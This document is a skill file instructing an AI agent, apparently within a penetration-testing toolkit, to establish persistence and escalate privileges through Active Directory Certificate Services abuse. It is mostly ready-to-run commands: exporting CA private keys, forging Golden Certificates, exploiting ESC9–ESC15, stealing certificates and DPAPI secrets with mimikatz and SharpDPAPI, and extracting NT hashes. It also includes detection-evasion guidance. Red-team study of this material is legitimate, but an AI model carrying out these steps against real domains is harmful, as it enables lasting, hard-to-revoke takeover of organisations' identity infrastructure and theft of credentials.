---
name: adcs-persistence
description: >
  Establishes persistence and exploits weak certificate mapping in AD CS.
  Covers ESC9 (no security extension), ESC10 (weak certificate mapping),
  ESC12-15 (YubiHSM, issuance policy, altSecIdentities, application policies),
  Golden Certificate (forge with stolen CA key), certificate theft
  (DPAPI/CAPI/CNG), and account persistence via certificate mapping.
keywords:
  - ESC9
  - ESC10
  - ESC12
  - ESC13
  - ESC14
  - ESC15
  - golden certificate
  - certificate theft
  - certificate persistence
  - certificate mapping
  - altSecurityIdentities
  - DPAPI certificate
  - forge certificate
  - CA private key
  - KB5014754
  - strong certificate binding
  - StrongCertificateBindingEnforcement
tools:
  - Certipy
  - Certify.exe
  - ForgeCert
  - mimikatz
  - SharpDPAPI
  - Rubeus
opsec: medium
---

# ADCS Persistence & Certificate Mapping Attacks

You are helping a penetration tester establish persistence through AD CS
certificate abuse and exploit weak certificate mapping configurations. All
testing is under explicit written authorization.

**Kerberos-first authentication**: Certificate authentication uses PKINIT
(pure Kerberos) by default. Post-exploitation operations use ccache-based
Kerberos to avoid NTLM detection (Event 4776, CrowdStrike Identity Module).

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[adcs-persistence] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Varies by technique (see individual sections)
- Tools: `certipy`, `Certify.exe`, `ForgeCert`, `mimikatz`, `SharpDPAPI`,
  `Rubeus`, `openssl`

**Kerberos-first workflow**:

```bash
cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP
export KRB5CCNAME=$TMPDIR/user.ccache
```

**Tool output directory**: `getTGT.py`, `certipy req`, `certipy auth`, and
`certipy shadow` all write output files to CWD with no output-path flag.
Always prefix these commands with `cd $TMPDIR &&` to keep files out of the
working directory. `getTGT.py` does NOT support `-out` — CWD is the only
control. When saving evidence, use `mv` (not `cp`) to avoid stray duplicates:

```bash
mv $TMPDIR/administrator.pfx engagement/evidence/administrator-esc9.pfx
mv $TMPDIR/administrator.ccache engagement/evidence/administrator-esc9.ccache
```

## Overview: Technique Selection

| Technique | Access Required | Persistence Duration | OPSEC |
|-----------|----------------|---------------------|-------|
| Golden Certificate | CA admin / CA server access | Until CA cert expires (5-10+ years) | Medium |
| User cert persistence | Any user | Until cert expires (1-2 years, renewable) | Low |
| Machine cert persistence | SYSTEM on target | Until cert expires | Low |
| altSecIdentities mapping | Write on target user | Until mapping removed | Low |
| Enrollment agent | Enrollment Agent template access | Until agent cert revoked | Medium |
| ESC9/10 mapping bypass | GenericWrite + weak mapping config | Per-certificate lifetime | Medium |
| ESC13 issuance policy | Enrollment rights on linked template | Per-certificate lifetime | Low |
| ESC14 explicit mapping | Write on target altSecIdentities | Until mapping removed | Low |
| ESC15 application policies | Schema v1 template with ESS | Per-certificate lifetime | Medium |
| Certificate theft | Access to cert store / DPAPI keys | Until cert expires or revoked | Low-Medium |

### Decision tree

```
What do you have?
├── CA server access or CA admin → Golden Certificate (Step 1)
├── Any domain user → User cert persistence (Step 2)
├── SYSTEM on a machine → Machine cert persistence (Step 2) + cert theft (Step 4)
├── GenericWrite on accounts + weak mapping → ESC9/10 (Step 3)
├── Write on altSecIdentities → ESC14 / explicit mapping (Step 5)
├── Enrollment rights on OID-linked template → ESC13 (Step 6)
├── Schema v1 template with ESS → ESC15 (Step 7)
├── CA uses YubiHSM → ESC12 (Step 8)
└── Want to steal existing certs → Certificate theft (Step 4)
```

## Step 1: Golden Certificate

Forge certificates signed with the stolen CA private key. Valid until the CA
certificate expires (typically 5-10+ years). Cannot be revoked (unknown to CA
database). The most powerful ADCS persistence mechanism.

### Obtain CA certificate with private key

```bash
# Certipy — backup CA cert + key (requires CA admin)
certipy ca -k -no-pass -target CA.DOMAIN.LOCAL -ca 'DOMAIN-CA' -backup

# certutil (on CA server)
certutil -backupKey -f -p 'BackupPassword' C:\Windows\Tasks\ca-backup

# Mimikatz (on CA server — patch CAPI/CNG then export)
mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"

# GUI: certsrv.msc → Right-click CA → All Tasks → Back up CA
# Check "Private key and CA certificate"
```

### Forge certificate for any user

```bash
# Certipy — forge with SID (required for KB5014754 Full Enforcement)
certipy forge -ca-pfx DOMAIN-CA.pfx \
  -upn administrator@domain.local \
  -sid 'S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500' \
  -crl 'ldap:///'

# Certipy — copy extensions from existing certificate template
certipy forge -template existing-cert.pfx -ca-pfx DOMAIN-CA.pfx \
  -upn administrator@domain.local \
  -sid 'S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500'

# ForgeCert (C# / Windows)
ForgeCert.exe --CaCertPath DOMAIN-CA.pfx --CaCertPassword 'BackupPass' \
  --Subject "CN=Administrator" --SubjectAltName administrator@domain.local \
  --NewCertPath admin_forged.pfx --NewCertPassword 'CertPass'

# Certify (C# / Windows)
Certify.exe forge --ca-cert DOMAIN-CA.pfx --ca-cert-password 'BackupPass' \
  --upn administrator@domain.local \
  --sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500
```

**Critical parameters**:
- `-crl 'ldap:///'`: CRL distribution point — KDC checks for CDP presence and
  errors without it. Always include.
- `-sid`: Object SID — required for KB5014754 Full Enforcement (Feb 2025).
  Without it, PKINIT fails on modern DCs.
- `-template`: Copy Key Usage, Basic Constraints, and AIA extensions from an
  existing certificate for better stealth.

### Authenticate with forged certificate

```bash
# Certipy — PKINIT auth
certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP

# Rubeus
Rubeus.exe asktgt /user:administrator /certificate:admin_forged.pfx \
  /password:CertPass /ptt

# If PKINIT fails — LDAPS fallback
certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP -ldap-shell
```

## Step 2: User and Machine Certificate Persistence

Request legitimate certificates that survive password changes and provide
persistent access for the certificate lifetime (1-2 years, renewable).

### User certificate persistence

```bash
# Request certificate as current user (User template)
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' -template User

# Certify.exe
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /template:User

# Authenticate later (survives password changes)
certipy auth -pfx user.pfx -dc-ip DC_IP
```

### Machine certificate persistence

```bash
# Request as machine account (requires SYSTEM)
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /template:Machine /machine

# Authenticate — enables S4U2Self for service tickets
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:machine.pfx \
  /password:CertPass /ptt
```

### Certificate renewal (extend persistence)

```bash
# Renew before expiration — avoids new enrollment artifact
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template User -pfx user_old.pfx -renew -out user_renewed.pfx

# Windows native
certreq -enroll -user -cert SERIAL_OR_ID renew reusekeys
```

Renewed certificates automatically include the SID security extension,
maintaining compatibility with KB5014754 Full Enforcement.

## Step 3: ESC9 and ESC10 — Weak Certificate Mapping

These exploit weak certificate-to-account mapping configurations to
authenticate as a different user than the certificate owner.

### ESC9: No Security Extension

**Conditions**: `StrongCertificateBindingEnforcement` = 0 or 1 (default),
template has `CT_FLAG_NO_SECURITY_EXTENSION` flag, template has client-auth
EKU, attacker has GenericWrite over an intermediate account.

```bash
# Step 1: Shadow credentials on intermediate account (get their hash)
certipy shadow auto -username attacker@domain.local -password 'Pass' \
  -account intermediate

# Step 2: Change intermediate's UPN to target
certipy account update -username attacker@domain.local -password 'Pass' \
  -user intermediate -upn Administrator

# Step 3: Request certificate from ESC9-vulnerable template
certipy req -username intermediate@domain.local -hashes :INTERMEDIATE_HASH \
  -ca 'DOMAIN-CA' -template 'ESC9Template'

# Step 4: Restore intermediate's UPN
certipy account update -username attacker@domain.local -password 'Pass' \
  -user intermediate -upn intermediate@domain.local

# Step 5: Authenticate — cert maps to Administrator via UPN (no SID check)
certipy auth -pfx administrator.pfx -domain domain.local -dc-ip DC_IP
```

### ESC10: Weak Certificate Mapping Methods

**Variant 1**: `StrongCertificateBindingEnforcement` = 0 (no SID binding at all)

```bash
# Same workflow as ESC9 but works with any template
certipy shadow auto -username attacker@domain.local -password 'Pass' \
  -account intermediate
certipy account update -username attacker@domain.local -password 'Pass' \
  -user intermediate -upn administrator
certipy req -username intermediate@domain.local -hashes :HASH \
  -ca 'DOMAIN-CA' -template User
certipy account update -username attacker@domain.local -password 'Pass' \
  -user intermediate -upn intermediate@domain.local
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

**Variant 2**: `CertificateMappingMethods` includes UPN mapping (0x04)

```bash
# Map to computer account by changing UPN to computer$@domain
certipy account update -username attacker@domain.local -password 'Pass' \
  -user intermediate -upn 'DC$@domain.local'
certipy req -username intermediate@domain.local -hashes :HASH \
  -ca 'DOMAIN-CA' -template User
certipy account update -username attacker@domain.local -password 'Pass' \
  -user intermediate -upn intermediate@domain.local
# Authenticate — may need LDAP shell for machine accounts
certipy auth -pfx 'DC$.pfx' -dc-ip DC_IP -ldap-shell
```

### Check mapping configuration

```bash
# StrongCertificateBindingEnforcement (DC registry)
# 0 = no enforcement, 1 = compatibility (default pre-Feb 2025), 2 = full
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" \
  /v StrongCertificateBindingEnforcement

# CertificateMappingMethods (DC registry)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" \
  /v CertificateMappingMethods
# 0x04 = UPN mapping enabled (vulnerable)
```

## Step 4: Certificate Theft

Steal existing certificates from compromised hosts. No new enrollment
artifacts — uses existing certificates.

### THEFT1: Export via Crypto APIs

```bash
# Mimikatz — patch CAPI/CNG and export all certs
mimikatz.exe "crypto::capi" "crypto::cng" \
  "crypto::certificates /export /systemstore:CURRENT_USER"

# Machine certificates (requires SYSTEM)
mimikatz.exe "crypto::capi" "crypto::cng" \
  "crypto::certificates /export /systemstore:LOCAL_MACHINE"
```

### THEFT2: User certificates via DPAPI

```bash
# Locate private keys
# CAPI: %APPDATA%\Microsoft\Crypto\RSA\<User-SID>\
# CNG:  %APPDATA%\Microsoft\Crypto\Keys\

# Get DPAPI masterkey (in user context)
mimikatz.exe "dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc"

# SharpDPAPI — automated user cert extraction
SharpDPAPI.exe certificates /mkfile:C:\temp\mkeys.txt

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex \
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx
```

### THEFT3: Machine certificates via DPAPI

```bash
# Requires SYSTEM access
# Machine keys: %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\RSA\MachineKeys
# CNG keys: %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\Keys

# Extract DPAPI_SYSTEM LSA secret
mimikatz.exe "lsadump::secrets"
# Use DPAPI_SYSTEM to decrypt machine private keys

# SharpDPAPI — automated (escalates to SYSTEM internally)
SharpDPAPI.exe certificates /machine
```

### THEFT4: Certificates from filesystem

```bash
# Search for certificate files
Get-ChildItem -Recurse -Path C:\Users\ -Include *.pfx,*.p12,*.pkcs12,*.pem,*.key

# Extract hash from password-protected PFX for offline cracking
pfx2john.py certificate.pfx > engagement/evidence/pfx-hash.txt
```

**Do NOT crack hashes in this skill.** Save the PFX hash to
`engagement/evidence/` and return to the orchestrator with the hash file path,
hash type (PFX / hashcat mode 12400), and a routing recommendation to
**credential-cracking**.

### THEFT5: UnPAC the Hash (NTLM from PKINIT)

Extract NT hash from a TGT obtained via certificate — no LSASS touch required.

```bash
# Certipy — automatic UnPAC
certipy auth -pfx user.pfx -dc-ip DC_IP
# Output includes NT hash

# getnthash.py (PKINITtools)
export KRB5CCNAME=user.ccache
getnthash.py -key 'AS-REP-encryption-key' DOMAIN/user

# Rubeus
Rubeus.exe asktgt /user:target /certificate:cert.pfx \
  /password:CertPass /getcredentials
```

## Step 5: ESC14 — altSecIdentities Explicit Mapping

**Conditions**: Write access to target's `altSecurityIdentities` attribute.
Map your certificate to a victim account for persistent authentication.

### Mapping formats

**Strong mappings** (KB5014754-compatible, preferred):

| Format | Example |
|--------|---------|
| X509IssuerSerialNumber | `X509:<I>DC=local,DC=domain,CN=DOMAIN-CA<SR>1200000000AC11` |
| X509SKI | `X509:<SKI>abc123def456...` |
| X509SHA1PublicKey | `X509:<SHA1-PUKEY>abc123def456...` |

**Weak mappings** (deprecated, may be rejected on modern DCs):

| Format | Example |
|--------|---------|
| X509IssuerSubject | `X509:<I>IssuerName<S>SubjectName` |
| X509SubjectOnly | `X509:<S>SubjectName` |
| X509RFC822 | `X509:<RFC822>user@domain.com` |

### Exploitation

```bash
# Step 1: Obtain a certificate (request as yourself)
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' -template Machine

# Step 2: Extract certificate identifiers for mapping
certutil -Dump -v attacker.pfx
# Note Issuer and Serial Number

# Step 3: Add explicit mapping to victim account
# PowerShell
$Serial = '1200000000AC11000000002B'  # Reversed byte order from certutil
$Issuer = 'DC=local,DC=domain,CN=DOMAIN-CA'
$Map = "X509:<I>$Issuer<SR>$Serial"
Set-ADUser -Identity 'administrator' -Add @{altSecurityIdentities=$Map}

# Stifle.exe (dedicated tool)
Stifle.exe add /object:administrator /certificate:cert.pfx /password:CertPass

# Step 4: Authenticate as victim using your certificate
certipy auth -pfx attacker.pfx -dc-ip DC_IP
Rubeus.exe asktgt /user:administrator /certificate:attacker.pfx /password:CertPass
```

### Cleanup

```bash
Set-ADUser -Identity 'administrator' -Remove @{altSecurityIdentities=$Map}
```

## Step 6: ESC13 — Issuance Policy OID Group Link

**Conditions**: Template has issuance policy extension with OID linked to a
group (typically Universal group). Enrollment rights granted. Client-auth EKU.

The certificate automatically grants membership in the linked group via
issuance policy resolution.

```bash
# Enumerate vulnerable templates (certipy shows OID links)
certipy find -k -no-pass -dc-ip DC_IP -vulnerable -output engagement/evidence/certipy-adcs

# Request certificate from template with OID group link
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'ESC13Template'

# Authenticate — TGT includes group membership from OID link
Rubeus.exe asktgt /user:user /certificate:esc13.pfx /password:CertPass /nowrap
certipy auth -pfx esc13.pfx -dc-ip DC_IP
```

## Step 7: ESC15 — Application Policies Override (CVE-2024-49019)

**Conditions**: Schema version 1 template, `ENROLLEE_SUPPLIES_SUBJECT` set,
no manager approval, `authenticationenabled` = False.

Application Policies extension overrides the template's EKU. Inject client-auth
EKU into templates that normally only allow server-auth (like WebServer).

### Variant 1: ESC1-like via WebServer template

```bash
# Inject Client Authentication via application policies
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template WebServer -upn administrator@domain.local \
  --application-policies 'Client Authentication'

certipy auth -pfx administrator.pfx -dc-ip DC_IP -ldap-shell
```

### Variant 2: ESC3-like via Certificate Request Agent

```bash
# Inject Certificate Request Agent OID
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template WebServer \
  --application-policies '1.3.6.1.4.1.311.20.2.1'

# Use agent cert to enroll on behalf of administrator
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template User -on-behalf-of 'DOMAIN\administrator' \
  -pfx agent.pfx
```

**Note**: Patched November 2024 (CVE-2024-49019). Only works on unpatched CAs.

## Step 8: ESC12 — YubiHSM CA Key Extraction

**Conditions**: CA private key stored on YubiHSM2 device. Shell access on CA
server.

```bash
# Extract YubiHSM password from registry
reg query "HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword"

# Generate certificate for target user
certipy req -target CA.DOMAIN.LOCAL -username user@domain.local -password 'Pass' \
  -template User

# Repair certificate with CA private key via YubiHSM provider
certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my CA-COMMON-NAME

# Sign certificate with SAN extension
certutil -sign ./user.crt new.crt @extension.inf

# Authenticate
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx
```

## Step 9: KB5014754 — Strong Certificate Binding Enforcement

Since February 2025, DCs enforce strong certificate binding by default.

### Impact on persistence techniques

| Technique | Impact | Workaround |
|-----------|--------|------------|
| Golden Certificate | Must include SID in forged cert | Use `-sid` flag in certipy forge |
| User cert persistence | Works (SID auto-included since May 2022) | None needed |
| ESC9/10 | Blocked if enforcement = 2 (Full) | Only works with enforcement 0 or 1 |
| altSecIdentities | Strong formats work, weak formats may be rejected | Use IssuerSerialNumber format |
| Enrollment agent | Works (cert maps to actual requester) | None needed |

### Check enforcement level

```bash
# On domain controller
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" \
  /v StrongCertificateBindingEnforcement
# 0 = disabled, 1 = compatibility mode, 2 = full enforcement (default Feb 2025)
```

## Step 10: Escalate or Pivot

After establishing persistence:

- **Golden Certificate forged**: Can impersonate any user indefinitely — route
  to **credential-dumping** for DCSync if needed
- **Certificates stolen**: Use for lateral movement — route to **pass-the-hash**
  (with NT hash from UnPAC) or authenticate directly
- **ESC9/10 exploited**: Escalate if additional templates
  are vulnerable
- **altSecIdentities mapped**: Persistent access to specific accounts — use for
  ongoing access
- **Need domain-wide persistence**: Combine golden cert + AdminSDHolder
  (**acl-abuse**) + golden ticket (**kerberos-ticket-forging**)

## Troubleshooting

### KDC_ERR_CERTIFICATE_MISMATCH (forged cert)
DC enforces strong certificate binding (KB5014754). Include `-sid` flag when
forging: `certipy forge -ca-pfx CA.pfx -upn admin@domain -sid S-1-5-21-...-500`.
Also include `-crl 'ldap:///'` for CDP extension.

### PKINIT fails — KDC_ERR_PADATA_TYPE_NOSUPP
DC doesn't support PKINIT pre-auth. Use LDAPS/Schannel fallback:
`certipy auth -pfx cert.pfx -ldap-shell`. From LDAP shell, set RBCD or modify
attributes for alternative exploitation.

### UnPAC returns empty hash
Certificate may not have PKINIT EKU, or DC's PAC_CREDENTIAL_INFO is empty.
Try `certipy auth -pfx cert.pfx -ldap-shell` for LDAPS-based access instead.

### Shadow credentials fails (ESC9/10)
Target account's `msDS-KeyCredentialLink` may be protected or monitored. Use
targeted Kerberoasting or password change as alternative to shadow credentials
for obtaining intermediate account access.

### Certificate theft — non-exportable key
Mimikatz patches CAPI/CNG to bypass non-exportable flag:
`mimikatz.exe "crypto::capi"` (current user) or `"crypto::cng"` (LSASS).

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### OPSEC comparison

| Technique | OPSEC | Detection Surface |
|-----------|-------|-------------------|
| Golden Certificate | Medium | CA backup event (if logged), forged cert not in CA DB |
| User cert persistence | Low | Standard enrollment event (4887), blends with normal |
| Machine cert persistence | Low | Standard enrollment, requires SYSTEM |
| Certificate theft (CAPI) | Low | In-process patch, no LSASS touch |
| Certificate theft (CNG) | Medium | LSASS memory patch detected by EDR |
| Certificate theft (DPAPI) | Low-Medium | Masterkey access, no LSASS patch |
| ESC9/10 | Medium | UPN change events (4738), shadow cred events |
| ESC14 mapping | Low | altSecIdentities modification (5136) |
| ESC13 OID link | Low | Standard enrollment, group membership in TGT |
| ESC15 app policies | Medium | Non-standard application policy in cert request |
